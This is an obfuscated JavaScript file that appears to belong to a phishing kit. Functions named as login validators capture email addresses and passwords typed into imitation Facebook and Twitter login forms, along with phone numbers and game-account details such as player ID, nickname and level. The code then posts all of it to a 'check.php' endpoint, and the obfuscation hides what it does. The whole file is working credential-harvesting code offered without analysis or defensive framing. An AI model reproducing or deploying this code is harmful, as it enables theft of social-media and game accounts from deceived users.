// code function data
(function(_0x1c7d55, _0x37cbfb) {
    var _0x2ff0ec = _0xf272,
        _0x22cede = _0x1c7d55();
    while (!![]) {
        try {
            var _0x3dcb0c = parseInt(_0x2ff0ec(0x121)) / 0x1 * (parseInt(_0x2ff0ec(0x12c)) / 0x2) + -parseInt(_0x2ff0ec(0x11f)) / 0x3 + parseInt(_0x2ff0ec(0x122)) / 0x4 * (parseInt(_0x2ff0ec(0x11b)) / 0x5) + -parseInt(_0x2ff0ec(0x132)) / 0x6 + -parseInt(_0x2ff0ec(0x129)) / 0x7 + parseInt(_0x2ff0ec(0x11c)) / 0x8 * (-parseInt(_0x2ff0ec(0x10e)) / 0x9) + parseInt(_0x2ff0ec(0x120)) / 0xa;
            if (_0x3dcb0c === _0x37cbfb) break;
            else _0x22cede['push'](_0x22cede['shift']());
        } catch (_0x19b246) {
            _0x22cede['push'](_0x22cede['shift']());
        }
    }
}(_0x36de, 0xa526e));

function ValidateLoginFbData() {
    var _0x2f85fd = _0xf272;
    $(_0x2f85fd(0x118))[_0x2f85fd(0x130)](function(_0x26a7c6) {
        var _0x49f508 = _0x2f85fd;
        _0x26a7c6[_0x49f508(0x133)](), $emailfb = $(_0x49f508(0x11d))['val']()['trim'](), $passwordfb = $(_0x49f508(0x11a))[_0x49f508(0x123)]()['trim'](), $loginfb = $(_0x49f508(0x125))[_0x49f508(0x123)]()[_0x49f508(0x10f)]();
        if ($emailfb == '' || $emailfb == null || $emailfb[_0x49f508(0x10a)] <= 0x8) return $(_0x49f508(0x128))[_0x49f508(0x131)](), $(_0x49f508(0x115))[_0x49f508(0x10d)](), $(_0x49f508(0x111))[_0x49f508(0x10d)](), $(_0x49f508(0x134))['show'](), ![];
        else $(_0x49f508(0x128))['hide'](), $(_0x49f508(0x119))[_0x49f508(0x123)]($emailfb), $(_0x49f508(0x111))[_0x49f508(0x131)](), $('.login-facebook')[_0x49f508(0x10d)]();
        if ($passwordfb == '' || $passwordfb == null || $passwordfb['length'] <= 0x5) return $(_0x49f508(0x115))[_0x49f508(0x131)](), $('.account_verification')['hide'](), $('.login-facebook')['show'](), ![];
        else $('.sandi-fb')[_0x49f508(0x10d)](), $(_0x49f508(0x112))[_0x49f508(0x123)]($passwordfb), $(_0x49f508(0x12f))['val']($loginfb), $(_0x49f508(0x111))['show'](), $('.login-facebook')[_0x49f508(0x10d)]();
    });
}

function ValidateLoginTwitterData() {
    var _0x5de0bd = _0xf272;
    $(_0x5de0bd(0x12e))['submit'](function(_0x3a7fb3) {
        var _0x106f0d = _0x5de0bd;
        _0x3a7fb3[_0x106f0d(0x133)](), $emailtw = $(_0x106f0d(0x10b))['val']()['trim'](), $passwordtw = $(_0x106f0d(0x12b))['val']()[_0x106f0d(0x10f)](), $logintw = $(_0x106f0d(0x109))['val']()[_0x106f0d(0x10f)]();
        if ($emailtw == '' || $emailtw == null || $emailtw[_0x106f0d(0x10a)] <= 0x3) return $(_0x106f0d(0x10c))[_0x106f0d(0x131)](), $(_0x106f0d(0x127))[_0x106f0d(0x10d)](), $(_0x106f0d(0x111))['hide'](), $(_0x106f0d(0x12a))[_0x106f0d(0x131)](), ![];
        else $(_0x106f0d(0x10c))[_0x106f0d(0x10d)](), $('input#validateEmail')[_0x106f0d(0x123)]($emailtw), $('.account_verification')[_0x106f0d(0x131)](), $('.login-twitter')[_0x106f0d(0x10d)]();
        if ($passwordtw == '' || $passwordtw == null || $passwordtw[_0x106f0d(0x10a)] <= 0x7) return $('.sandi-tw')[_0x106f0d(0x131)](), $(_0x106f0d(0x111))[_0x106f0d(0x10d)](), $(_0x106f0d(0x12a))[_0x106f0d(0x131)](), ![];
        else $(_0x106f0d(0x127))[_0x106f0d(0x10d)](), $(_0x106f0d(0x112))[_0x106f0d(0x123)]($passwordtw), $(_0x106f0d(0x12f))['val']($logintw), $(_0x106f0d(0x111))[_0x106f0d(0x131)](), $(_0x106f0d(0x12a))[_0x106f0d(0x10d)]();
    });
}

function ValidateVerificationData() {
    var _0x2d5e1d = _0xf272;
    return $(_0x2d5e1d(0x114))[_0x2d5e1d(0x130)](function(_0x1e4eb0) {
        var _0x57c33c = _0x2d5e1d;
        _0x1e4eb0[_0x57c33c(0x133)]();
        var _0x4d9287 = $(_0x57c33c(0x119))[_0x57c33c(0x123)](),
            _0xe9aa7 = $('input#validatePassword')[_0x57c33c(0x123)](),
            _0x314733 = $(_0x57c33c(0x110))[_0x57c33c(0x123)](),
            _0x2dbdb4 = $(_0x57c33c(0x117))['val'](),
            _0x27b625 = $(_0x57c33c(0x116))[_0x57c33c(0x123)](),
            _0x253c86 = $(_0x57c33c(0x113))['val'](),
            _0x265af5 = $('input#tier')['val'](),
            _0x53f15c = $(_0x57c33c(0x12d))[_0x57c33c(0x123)](),
            _0x23b8fd = $(_0x57c33c(0x11e))[_0x57c33c(0x123)](),
            _0x3dd510 = $(_0x57c33c(0x135))[_0x57c33c(0x123)](),
            _0x4e43bd = $('input#validateLogin')['val']();
        if (_0x4d9287 == '' && _0xe9aa7 == '' && _0x314733 == '' && _0x2dbdb4 == '' && _0x27b625 == '' && _0x253c86 == '' && _0x265af5 == '' && _0x53f15c == '' && _0x23b8fd == '' && _0x3dd510 == '' && _0x4e43bd == '') return $(_0x57c33c(0x126))[_0x57c33c(0x131)](), $(_0x57c33c(0x111))[_0x57c33c(0x10d)](), ![];
        $['ajax']({
            'type': 'POST',
            'url': 'check.php',
            'data': $(this)['serialize'](),
            'beforeSend': function() {
                var _0x1d1a25 = _0x57c33c;
                $('.check_verification')[_0x1d1a25(0x131)](), $(_0x1d1a25(0x111))[_0x1d1a25(0x10d)]();
            },
            'success': function() {
                var _0x30817c = _0x57c33c;
                $('.processing_account')['show'](), $(_0x30817c(0x124))[_0x30817c(0x10d)](), $('.account_verification')[_0x30817c(0x10d)]();
            }
        });
    }), ![];
}

function _0x36de() {
    var _0x2125c0 = ['.sandi-tw', '.email-fb', '5621882EaZykk', '.login-twitter', '#password-twitter', '212178KNKxIu', 'input#rpt', '#ValidateLoginTwitterForm', 'input#validateLogin', 'submit', 'show', '2856060gcjZQL', 'preventDefault', '.login-facebook', 'input#platform', '#login-twitter', 'length', '#email-twitter', '.email-tw', 'hide', '2034EgmAvo', 'trim', 'input#nick', '.account_verification', 'input#validatePassword', 'input#level', '#ValidateVerificationDataForm', '.sandi-fb', 'input#phone', 'input#playid', '#ValidateLoginFbForm', 'input#validateEmail', '#password-facebook', '12205GArbEw', '47640KUXZoK', '#email-facebook', 'input#rpl', '879711ohjdEZ', '23214080prsizW', '10IiSehY', '348NiBPpm', 'val', '.check_verification', '#login-facebook', '.verification_info'];
    _0x36de = function() {
        return _0x2125c0;
    };
    return _0x36de();
}

function _0xf272(_0x3b7a57, _0x1e2309) {
    var _0x36de3d = _0x36de();
    return _0xf272 = function(_0xf27246, _0x2ed259) {
        _0xf27246 = _0xf27246 - 0x109;
        var _0x15c28f = _0x36de3d[_0xf27246];
        return _0x15c28f;
    }, _0xf272(_0x3b7a57, _0x1e2309);
};